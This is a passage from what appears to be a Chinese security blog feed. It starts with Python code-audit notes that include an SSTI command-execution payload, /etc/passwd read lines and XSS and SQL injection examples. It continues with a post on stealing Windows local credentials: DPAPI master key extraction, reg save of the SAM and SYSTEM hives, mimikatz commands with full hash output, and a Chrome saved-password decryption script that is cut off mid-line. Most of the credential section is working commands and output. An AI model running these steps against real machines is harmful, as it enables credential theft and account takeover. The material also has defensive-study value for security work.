class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"><span class="keyword">from</span> mako.template <span class="keyword">import</span> Template</span><br><span class="line"><span class="comment"># http://127.0.0.1:9999/api/test/?name=&#123;&#123;11*10&#125;&#125;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">request</span>):</span><br><span class="line">    name = request.GET[<span class="string">&quot;name&quot;</span>]</span><br><span class="line">    t = Template(<span class="string">&quot;Hello,&quot;</span>+name)</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(t.render())</span><br></pre></td></tr></table></figure><p>进行代码执行，没有回显</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)%&gt;</span><br><span class="line">$&#123;<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;whoami&quot;</span>)&#125;</span><br></pre></td></tr></table></figure><p><strong>XXE</strong></p><p>对于XXE问题只需要设置resolve_entities为False即可解决漏洞，如果没有设置的都能够执行命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">parser = etree.XMLParser(resolve_entities=<span class="literal">False</span>)</span><br><span class="line">tree = etree.fromstring(xml,etree.XMLParser(resolve_entities=<span class="literal">False</span>))</span><br></pre></td></tr></table></figure><p>任意文件读取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> codecs;codecs.<span class="built_in">open</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class="line">file(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br></pre></td></tr></table></figure><p><strong>Server Side Request</strong><br>重定向</p><p>是否默认跟随重定向<br>1.pycurl（不跟随）<br>2.urllib&#x2F;urllib2&#x2F;requests（跟随）</p><p>默认最大重定向次数<br>1.pycurl（未限制）<br>2.urllib&#x2F;urllib2（10次）<br>3.requests（30次）</p><p>协议支持</p><p>urllib&#x2F;urllib2：分别有协议类型http、https、ftp、file</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python3</span></span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line">a= request.urlopen(<span class="string">&#x27;file:///etc/passwd&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(a.read())</span><br><span class="line"><span class="comment"># python2</span></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line">a=urllib.urlopen(<span class="string">&#x27;file:///etc/passwd&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(a.read())</span><br><span class="line">b=urllib2.urlopen(<span class="string">&#x27;file:///etc/passwd&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(b.read())</span><br></pre></td></tr></table></figure><p>requests：分别有协议类型http、https、ftp<br>pycurl：分别有协议类型dict、file、ftp、ftps、gopher、http、https、imap、imaps、ldap、ldaps、pop3、pop3s、rtmp、rtsp、scp、sftp、smtp、smtps、telnet和tftp。libcurl支持ssl证书、http-post、http-put、ftp上传、基于http表单的上传、代理、cookie、用户+密码认证（basic、digest、ntlm、negotiate、kerberos4）、文件传输恢复、http代理隧道等</p><p><strong>XSS</strong></p><p>未对输入和输出做过滤，以Django举例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</span><br><span class="line"><span class="comment"># http://127.0.0.1:9999/api/test/?name=&lt;video&gt;&lt;source onerror=&quot;alert(1)&quot;&gt;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">request</span>):</span><br><span class="line">    name = request.GET[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">&#x27;hello %s&#x27;</span> %(name))</span><br><span class="line">    <span class="comment"># return render(&#x27;hello.html&#x27;, &#123;&#x27;name&#x27;:name&#125;)  # Django3以上正确的代码 </span></span><br></pre></td></tr></table></figure><p><strong>SQL</strong></p><p>安全的写法</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stmt <span class="operator">=</span> &quot;SELECT * FROM table WHERE id=?&quot;</span><br><span class="line">connection.execute(stmt, (<span class="keyword">value</span>,))</span><br></pre></td></tr></table></figure><p>不安全的写法</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;SELECT * FROM table WHERE id=&quot; <span class="operator">+</span> <span class="keyword">value</span></span><br><span class="line">&quot;SELECT * FROM table WHERE id=%s&quot; <span class="operator">%</span> <span class="keyword">value</span></span><br><span class="line">&quot;SELECT * FROM table WHERE id=&#123;0&#125;&quot;.format(<span class="keyword">value</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 审计 </tag>
            
            <tag> 代码安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows本地密码抓取</title>
      <link href="/posts/b85a533c.html"/>
      <url>/posts/b85a533c.html</url>
      
        <content type="html"><![CDATA[<p><font color=red>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</font></p><h3 id="系统密码"><a href="#系统密码" class="headerlink" title="系统密码"></a>系统密码</h3><h4 id="DPAPI解密"><a href="#DPAPI解密" class="headerlink" title="DPAPI解密"></a>DPAPI解密</h4><p>使用用户登录密码解密Master Key file，获得Master Key</p><p>固定位置： %APPDATA%\Microsoft\Protect%SID%下往往有多个Master Key file</p><p>这是为了安全起见，系统每隔90天会自动生成一个新的Master Key(旧的不会删除)%APPDATA%\Microsoft\Protect%SID%下存在一个固定文件Preferred，包含最后一个Master Key file的名称和创建时间，文件结构如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _tagPreferredMasterKey</span><br><span class="line">&#123;</span><br><span class="line">  GUID guidMasterKey;</span><br><span class="line">  FILETIME ftCreated;</span><br><span class="line">&#125; PREFERREDMASTERKEY, *PPREFERREDMASTERKEY;</span><br></pre></td></tr></table></figure><p>完整的流程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">找到本机的Master Key file</span><br><span class="line">从Master Key file中获取到Master Key</span><br><span class="line">通过Master Key解密DPAPI blob获得明文</span><br></pre></td></tr></table></figure><p>本地保存RDP密码</p><p>首先需要打开隐藏受保护的操作系统文件，不打开的话就算打开了显示隐藏的文件、文件夹和驱动器也是看不到的<br><img src= "" data-lazy-src="https://w0xking.github.io/picx-images-hosting/win_pass/4181.7awyfyvnno.jpg" alt="Alt pic"></p><p>接着打开文件C:\Users\用户名\AppData\Local\Microsoft\Credentials就可以看到保存的数据了</p><p><img src= "" data-lazy-src="https://w0xking.github.io/picx-images-hosting/win_pass/4182.4912equbgn.jpg" alt="Alt pic"></p><p>使用cmdkey &#x2F;line命令可以查看本地保存了哪些密码，如果你连过其他服务器如果点击了保存密码就能抓取到</p><p><img src= "" data-lazy-src="https://w0xking.github.io/picx-images-hosting/win_pass/4183.361d3uyhl5.jpg" alt="Alt pic"></p><p>使用🥝读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpapi::cred /in:C:\Users\ascotbe\AppData\Local\Microsoft\Credentials\SESSIONID</span><br></pre></td></tr></table></figure><p><img src= "" data-lazy-src="https://w0xking.github.io/picx-images-hosting/win_pass/4184.6wqip3ncsr.jpg" alt="Alt pic"></p><p>获取到guidMasterKey其实就是我们的master key file名称</p><pre><code>切记一点不同的SESSIONID如果间隔时间超过90天那么对应的guidMasterKey也是不同的</code></pre><p>通过命令获取到Master Key file的Master Key，下文中GUID&#x3D;&#x3D;Master Key file，MasterKey&#x3D;&#x3D;Master Key</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">EeLrXMiD # sekurlsa::dpapi</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 229076 (00000000:00037ed4)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : ascotbe</span><br><span class="line">Domain            : 樱岛麻衣</span><br><span class="line">Logon Server      : 樱岛麻衣</span><br><span class="line">Logon Time        : 2021/6/7 9:37:53</span><br><span class="line">SID               : S-1-5-21-1645164750-2672341361-3879437546-1000</span><br><span class="line">         [00000000]</span><br><span class="line">         * GUID      :  &#123;d3fcdbfb-06bd-49f0-98b4-ac08664c176a&#125;</span><br><span class="line">         * Time      :  2021/6/7 9:37:59</span><br><span class="line">         * MasterKey :  7da666987b2b6a51db3148cd01a6fe460a79315d1678a24b327d251c4f9138eecbb7ca4919de8de678628963761ee731a1316b78a6a982d0d4a9c590f5171c9e</span><br><span class="line">         * sha1(key) :  efd1c9d7290d13b3ecc1e288accfc5d6707d3403</span><br><span class="line">         [00000001]</span><br><span class="line">         * GUID      :  &#123;33449413-8697-4a85-a075-778b49015fbe&#125;</span><br><span class="line">         * Time      :  2021/6/8 17:17:37</span><br><span class="line">         * MasterKey :  0ac77f164c38e751f303e26d883cd15e3eb3861f2d69c2ba192035511bfc8f2880f206ef238de4d282384c813326feeaef364b9089c86a97a5169f31dbd319ee</span><br><span class="line">         * sha1(key) :  f45701db86a93d9b860be725d7eaf32a9a684a77</span><br><span class="line">         [00000002]</span><br><span class="line">         * GUID      :  &#123;788f0828-1d1e-478d-adf6-7a37e92182e8&#125;</span><br><span class="line">         * Time      :  2021/6/7 18:01:08</span><br><span class="line">         * MasterKey :  6a9ece2f3bd683c2ac14c69e13465399e9ce20c2930dd51dd9378eed800b06b409f7f4bef926e503d85a0b9e5e1f4cc5ccd01fb2ddaa8de90d086bf3a8ae3bf3</span><br><span class="line">         * sha1(key) :  f2d6c58b2d2f0a91e07dc0d1cb7db7cb8935f955</span><br></pre></td></tr></table></figure><p>只需要使用SESSIONID对应的GUID和MasterKey就能解密数据了</p><p>dpapi::cred &#x2F;in:C:\Users\ascotbe\AppData\Local\Microsoft\Credentials\SESSION &#x2F;masterkey:对应的GUID MasterKey</p><p><img src= "" data-lazy-src="https://w0xking.github.io/picx-images-hosting/win_pass/4185.6m3ovy84nh.jpg" alt="Alt pic"></p><p>TargetName是目标机器，UserName是账号，CredentialBlob是密码</p><h3 id="本机密码"><a href="#本机密码" class="headerlink" title="本机密码"></a>本机密码</h3><h4 id="通过注册列表抓取密码"><a href="#通过注册列表抓取密码" class="headerlink" title="通过注册列表抓取密码"></a>通过注册列表抓取密码</h4><p>首先需要管理员权限，抓取注册列表中保存的哈希</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SYSTEM SYSTEM</span><br><span class="line">reg save HKLM\SAM SAM</span><br></pre></td></tr></table></figure><p>然后通过🥝进行解密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::sam /sam:SAM /system:SYSTEM</span><br></pre></td></tr></table></figure><p>解密后的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">Windows PowerShell</span><br><span class="line">版权所有 (C) Microsoft Corporation。保留所有权利。</span><br><span class="line"></span><br><span class="line">尝试新的跨平台 PowerShell https://aka.ms/pscore6</span><br><span class="line"></span><br><span class="line">PS C:\Users\ascotbe&gt; cd .\Desktop\</span><br><span class="line">PS C:\Users\ascotbe\Desktop&gt; reg save HKLM\SYSTEM SYSTEM</span><br><span class="line">操作成功完成。</span><br><span class="line">PS C:\Users\ascotbe\Desktop&gt; reg save HKLM\SAM SAM</span><br><span class="line">操作成功完成。</span><br><span class="line">PS C:\Users\ascotbe\Desktop&gt; .\x64.exe</span><br><span class="line"></span><br><span class="line">  .#####.   EeLrXMiD 2.2.0 (x64) #19041 Oct 10 2020 14:46:27</span><br><span class="line"> .## ^ ##.  &quot;e2G6OxuvUXNR1&#x27;Amour&quot; - (IcaHL)</span><br><span class="line"> ## / \ ##  /*** ST1KQSnf huXMA `gVhmWw70VD` ( NceCVtrwTckaqiPu3XOVsQl )</span><br><span class="line"> ## \ / ##       &gt; https://blog.gVhmWw70VD.com/EeLrXMiD</span><br><span class="line"> &#x27;## v ##&#x27;       Hp6bmVPNVLO9i7B             ( FiLGZos4eo99IXHOADBc44Ir )</span><br><span class="line">  &#x27;#####&#x27;        &gt; https://ljrq4GxgPj6NY7 / https://A35s5WaTWwdjV2m6 ***/</span><br><span class="line"></span><br><span class="line">EeLrXMiD # privilege::debug</span><br><span class="line">Privilege &#x27;20&#x27; OK</span><br><span class="line"></span><br><span class="line">EeLrXMiD # lsadump::sam /sam:SAM /system:SYSTEM</span><br><span class="line">Domain : 樱岛麻衣</span><br><span class="line">SysKey : 42939b566ede597c3284d1bd23b15a97</span><br><span class="line">Local SID : S-1-5-21-1645164750-2672341361-3879437546</span><br><span class="line"></span><br><span class="line">SAMKey : b58a3643feb8148887485d5b702aaf3f</span><br><span class="line"></span><br><span class="line">RID  : 000001f4 (500)</span><br><span class="line">User : Administrator</span><br><span class="line">  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM-Strong-NTOWF *</span><br><span class="line">    Random Value : 900fff43b7507160b3e239892c034c22</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos-Newer-Keys *</span><br><span class="line">    Default Salt : ASCOTBE1B49Administrator</span><br><span class="line">    Default Iterations : 4096</span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (4096) : 8185175d7c176c6decf21cbfbde54df0a4b86cca948bb660091d2a873073b26b</span><br><span class="line">      aes128_hmac       (4096) : ce32484a789bb52f0e43fa09ddac2bf0</span><br><span class="line">      des_cbc_md5       (4096) : f8f7ad86cd6e9840</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM-Strong-NTOWF</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos *</span><br><span class="line">    Default Salt : ASCOTBE1B49Administrator</span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5       : f8f7ad86cd6e9840</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RID  : 000001f5 (501)</span><br><span class="line">User : Guest</span><br><span class="line"></span><br><span class="line">RID  : 000001f7 (503)</span><br><span class="line">User : DefaultAccount</span><br><span class="line"></span><br><span class="line">RID  : 000001f8 (504)</span><br><span class="line">User : WDAGUtilityAccount</span><br><span class="line">  Hash NTLM: 4c5c287f286dce27cdd13c6b221979df</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM-Strong-NTOWF *</span><br><span class="line">    Random Value : 38ab6a222bbf783640bdcbb714227d57</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos-Newer-Keys *</span><br><span class="line">    Default Salt : WDAGUtilityAccount</span><br><span class="line">    Default Iterations : 4096</span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (4096) : c60e0605a0f960188d252efb376231de1e1fb3c2fbfd66cbc4a528d364a37bfc</span><br><span class="line">      aes128_hmac       (4096) : fb6b091efaa644e306673fcd565ce4f4</span><br><span class="line">      des_cbc_md5       (4096) : a1648949c202689e</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM-Strong-NTOWF</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos *</span><br><span class="line">    Default Salt : WDAGUtilityAccount</span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5       : a1648949c202689e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RID  : 000003e8 (1000)</span><br><span class="line">User : ascotbe</span><br><span class="line">  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM-Strong-NTOWF *</span><br><span class="line">    Random Value : 42d6e016527f7bce204d94cc40baa99a</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos-Newer-Keys *</span><br><span class="line">    Default Salt : ASCOTBE1B49ascotbe</span><br><span class="line">    Default Iterations : 4096</span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (4096) : 35c0a798a120c3b112bcdb7636b8dd3e3b12284c0e85a5b1c93bfbe9c4b83c02</span><br><span class="line">      aes128_hmac       (4096) : 12a06f6bb5ff719a314ddfe96c83c69e</span><br><span class="line">      des_cbc_md5       (4096) : fdd661fe76542cdf</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM-Strong-NTOWF</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos *</span><br><span class="line">    Default Salt : ASCOTBE1B49ascotbe</span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5       : fdd661fe76542cdf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">EeLrXMiD #</span><br></pre></td></tr></table></figure><p>我们只需要查看最后一个ascotbe（我本机这个是管理员用户）这个账户的Hash NTLM即可知道本机密码了，通过网站解密<br><img src= "" data-lazy-src="https://w0xking.github.io/picx-images-hosting/win_pass/4186.7p3e6u3yj2.jpg" alt="Alt pic"></p><h4 id="通过mimikatz抓取密码"><a href="#通过mimikatz抓取密码" class="headerlink" title="通过mimikatz抓取密码"></a>通过mimikatz抓取密码</h4><p>需要管理员权限执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p>即可得出密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">EeLrXMiD # sekurlsa::logonpasswords</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 229076 (00000000:00037ed4)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : ascotbe</span><br><span class="line">Domain            : 樱岛麻衣</span><br><span class="line">Logon Server      : 樱岛麻衣</span><br><span class="line">Logon Time        : 2021/6/7 9:37:53</span><br><span class="line">SID               : S-1-5-21-1645164750-2672341361-3879437546-1000</span><br><span class="line">        mSv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : ascotbe</span><br><span class="line">         * Domain   : 樱岛麻衣</span><br><span class="line">         * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0</span><br><span class="line">         * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709</span><br><span class="line">        tsPkG :</span><br><span class="line">         * Username : ascotbe</span><br><span class="line">         * Domain   : (null)</span><br><span class="line">         * Password : (null)</span><br><span class="line">        wDiGeST :</span><br><span class="line">         * Username : ascotbe</span><br><span class="line">         * Domain   : (null)</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kErberoS :</span><br><span class="line">         * Username : ascotbe</span><br><span class="line">         * Domain   : (null)</span><br><span class="line">         * Password : (null)</span><br><span class="line">        sSp :</span><br><span class="line">        crEdMan :</span><br><span class="line">        clOuDAp :</span><br></pre></td></tr></table></figure><h4 id="浏览器密码"><a href="#浏览器密码" class="headerlink" title="浏览器密码"></a>浏览器密码</h4><h5 id="Chrome浏览器数据"><a href="#Chrome浏览器数据" class="headerlink" title="Chrome浏览器数据"></a>Chrome浏览器数据</h5><p>Chrome的配置文件存放在%LocalAppData%目录下。如果有两个Google Chrome账号那么每个账号会有不同的配置文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\admin\AppData\Local\Google\Chrome\User Data\Default （第一个配置文件的名称）</span><br><span class="line">C:\Users\admin\AppData\Local\Google\Chrome\User Data\Profile 2 （后续的配置文件以迭代数字方式命名）</span><br></pre></td></tr></table></figure><p>目录中的Login Data是SQLite 3数据库文件，里面存放了各种网站和账号等信息。<br><img src= "" data-lazy-src="https://w0xking.github.io/picx-images-hosting/win_pass/4187.361d3uyhlc.jpg" alt="Alt pic"><br>我们只需要关注logins这张表即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">origin_url:登录网址</span><br><span class="line">username_value:用户名</span><br><span class="line">password_value:被加密的用户密码</span><br></pre></td></tr></table></figure><pre><code>chrome version 80（80.0.3987.163） 版本前</code></pre><p>chrome80以前的版本是直接可以通过DPAPI中的解密函数 CryptUnprotectData来进行解密的。</p><p>测试版本：chrome 79.0.3945.88</p><h4 id="A用户解A的chrome密码"><a href="#A用户解A的chrome密码" class="headerlink" title="A用户解A的chrome密码"></a>A用户解A的chrome密码</h4><p>直接使用命令即可解密出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpapi::chrome /in:&quot;C:\Users\ascotbe\AppData\Local\Google\Chrome\User Data\Default\Login Data&quot; /unprotect</span><br></pre></td></tr></table></figure><p><img src= "" data-lazy-src="https://w0xking.github.io/picx-images-hosting/win_pass/4188.231nsz2npt.jpg" alt="Alt pic"><br>也可以直接使用脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span>  shutil</span><br><span class="line"><span class="keyword">import</span>  sqlite3</span><br><span class="line"><span class="comment">#pip install pywin32</span></span><br><span class="line"><span class="keyword">import</span>  win32crypt</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">APP_DATA_PATH= os.environ[<span class="string">&#x27;LOCALAPPDATA&#x27;</span>]</span><br><span class="line">DB_PATH = <span class="string">r&#x27;Google\Chrome\User Data\Default\Login Data&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ChromePassword</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.passwordList = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_chrome_db</span>(<span class="params">self</span>):</span><br><span class="line">        _full_path = os.path.join(APP_DATA_PATH,DB_PATH)</span><br><span class="line">        _temp_path = os.path.join(APP_DATA_PATH,<span class="string">&#x27;sqlite_file&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(_temp_path):</span><br><span class="line">            os.remove(_temp_path)</span><br><span class="line">        shutil.copyfile(_full_path,_temp_path)</span><br><span class="line">        <span class="variable language_">self</span>.show_password(_temp_path)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">show_password</span>(<span class="params">self,db_file</span>):</span><br><span class="line">        conn = sqlite3.connect(db_file)</span><br><span class="line">        _sql = <span class="string">&#x27;select signon_realm,username_value,password_value from logins&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> conn.execute(_sql):</span><br><span class="line">            ret = win32crypt.CryptUnprotectData(row[<span class="number">2</span>],<span 